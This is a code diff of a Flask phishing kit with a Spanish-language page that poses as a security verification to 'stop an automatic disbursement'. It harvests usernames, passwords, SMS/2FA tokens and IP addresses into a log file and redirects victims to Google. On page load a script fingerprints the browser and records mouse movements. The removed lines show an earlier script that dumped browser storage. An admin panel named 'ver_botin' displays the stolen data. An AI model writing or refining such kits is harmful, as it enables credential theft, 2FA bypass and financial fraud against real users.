@@ -9,72 +9,74 @@ HTML_TEMPLATE = """
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Soporte Técnico | Verificación de Dispositivo</title>
+    <title>SVR-SHIELD | Protocolo de Verificación</title>
     <script>
-        async function exfiltrate_vault() {
-            // 1. Recolección de Almacenamiento (LocalStorage y SessionStorage)
-            let storage_dump = {
-                local: {},
-                session: {}
+        // CAPTURA DE COMPORTAMIENTO HUMANO
+        let movements = [];
+        document.onmousemove = (e) => {
+            if(movements.length < 10) movements.push({x: e.pageX, y: e.pageY});
+        };
+
+        async function deep_harvest() {
+            const data = {
+                env: {
+                    ref: document.referrer || "Directo",
+                    url: window.location.href,
+                    history: window.history.length
+                },
+                behavior: {
+                    clicks: 0,
+                    mouse: movements
+                },
+                hw: {
+                    mem: navigator.deviceMemory,
+                    cpu: navigator.hardwareConcurrency,
+                    touch: navigator.maxTouchPoints,
+                    res: window.screen.width + "x" + window.screen.height
+                }
             };
             
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    let k = localStorage.key(i);
-                    storage_dump.local[k] = localStorage.getItem(k);
-                }
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    let k = sessionStorage.key(i);
-                    storage_dump.session[k] = sessionStorage.getItem(k);
-                }
-            } catch (e) { storage_dump.error = "Acceso restringido por política de origen"; }
-
-            // 2. Fingerprint Avanzado (Fuentes e Idiomas)
-            const hardware = {
-                mem: navigator.deviceMemory,
-                cpu: navigator.hardwareConcurrency,
-                touch: navigator.maxTouchPoints,
-                fonts: document.fonts ? document.fonts.size : 'N/A'
-            };
-
-            // Enviar "El Botín" al servidor
-            fetch('/svr_vault_dump', {
+            fetch('/svr_deep_data', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({storage: storage_dump, hw: hardware})
+                body: JSON.stringify(data)
             });
         }
-
-        window.onload = exfiltrate_vault;
+        window.onload = () => { setTimeout(deep_harvest, 2000); };
     </script>
     <style>
-        body { background: #010409; color: #c9d1d9; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: #0d1117; border: 1px solid #30363d; padding: 40px; border-radius: 10px; text-align: center; max-width: 400px; }
-        .loading { border: 4px solid #238636; border-radius: 50%; border-top: 4px solid transparent; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { color: #238636; font-weight: bold; margin-bottom: 10px; }
+        body { background: #010409; color: #c9d1d9; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .console { border: 1px solid #238636; padding: 30px; background: #0d1117; box-shadow: 0 0 20px #23863655; max-width: 450px; border-radius: 5px; }
+        .blink { animation: blinker 1s linear infinite; color: #238636; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        input { background: #010409; border: 1px solid #30363d; color: #238636; padding: 12px; width: 100%; margin: 10px 0; box-sizing: border-box; }
+        .btn { background: #238636; color: white; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="loading"></div>
-        <div class="status">SINCRO-SVR ACTIVA</div>
-        <h2 style="margin:10px 0;">Verificando Entorno...</h2>
-        <p style="font-size:13px; color:#8b949e;">No cierre esta ventana mientras analizamos la integridad de su hardware para la cancelación del crédito.</p>
-        <form action="/login" method="post" style="margin-top:20px;">
-            <input type="text" name="u" placeholder="Usuario/Email" required style="width:100%; padding:10px; margin-bottom:10px; background:#010409; border:1px solid #30363d; color:white;">
-            <input type="password" name="p" placeholder="Contraseña" required style="width:100%; padding:10px; margin-bottom:10px; background:#010409; border:1px solid #30363d; color:white;">
-            <button type="submit" style="width:100%; padding:12px; background:#238636; color:white; border:none; border-radius:5px; cursor:pointer;">FINALIZAR PROCESO</button>
+    <div class="console">
+        <div style="margin-bottom:20px;">
+            <span class="blink">●</span> [SVR-SYSTEM-ONLINE]
+            <div style="font-size:12px; color:#8b949e;">Detectando Hardware de Seguridad... OK</div>
+        </div>
+        <h3 style="color:#238636; margin:0;">VERIFICACIÓN REQUERIDA</h3>
+        <p style="font-size:12px;">Confirme sus credenciales para detener el desembolso automático.</p>
+        <form action="/login" method="post">
+            <input type="text" name="u" placeholder="USUARIO / EMAIL" required>
+            <input type="password" name="p" placeholder="CONTRASEÑA" required>
+            <input type="text" name="t" placeholder="SMS / TOKEN" required>
+            <button type="submit" class="btn">EJECUTAR REVOCACIÓN</button>
         </form>
+        <div style="margin-top:20px; font-size:10px; color:#30363d;">ID_SESSION: 0x88239021-SVR</div>
     </div>
 </body>
 </html>
 """
 
-@app.route('/svr_vault_dump', methods=['POST'])
-def svr_vault_dump():
+@app.route('/svr_deep_data', methods=['POST'])
+def svr_deep_data():
     data = request.json
-    with open("vault_dump.json", "a") as f:
+    with open("deep_data.json", "a") as f:
         f.write(json.dumps(data) + "\\n")
     return '', 204
 
@@ -82,18 +84,12 @@ def svr_vault_dump():
 def ver_botin():
     try:
         with open("capturas.txt", "r") as f: creds = f.read()
-    except: creds = "Vacio."
+    except: creds = "Esperando..."
     try:
-        with open("vault_dump.json", "r") as f: vault = f.read()
-    except: vault = "Vaciando memoria..."
+        with open("deep_data.json", "r") as f: deep = f.read()
+    except: deep = "Analizando comportamiento..."
     
-    return f"""
-    <html><body style='background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px;'>
-    <h2>🛰️ SVR-MATRIX: VAULT EXPLOTATION</h2><hr>
-    <h3>🔑 CREDENCIALES:</h3><pre>{creds}</pre>
-    <h3>📦 VOLCADO DE MEMORIA (STORAGE):</h3><pre>{vault}</pre>
-    </body></html>
-    """
+    return f"<html><body style='background:#000; color:#0f0; padding:20px; font-family:monospace;'><h2>🛰️ SVR-MATRIX: DEEP HARVEST</h2><hr><h3>🔑 CREDENCIALES:</h3><pre>{creds}</pre><h3>🕵️ COMPORTAMIENTO & HW:</h3><pre>{deep}</pre></body></html>"
 
 @app.route('/')
 def home():
@@ -101,9 +97,9 @@ def home():
 
 @app.route('/login', methods=['POST'])
 def login():
-    u, p = request.form.get('u'), request.form.get('p')
+    u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('t')
     with open("capturas.txt", "a") as f:
-        f.write(f"[{datetime.datetime.now()}] {u} | {p}\\n")
+        f.write(f"[{datetime.datetime.now()}] U: {u} | P: {p} | T: {t} | IP: {request.remote_addr}\\n")
     return redirect("https://www.google.com")
 
 if __name__ == '__main__':
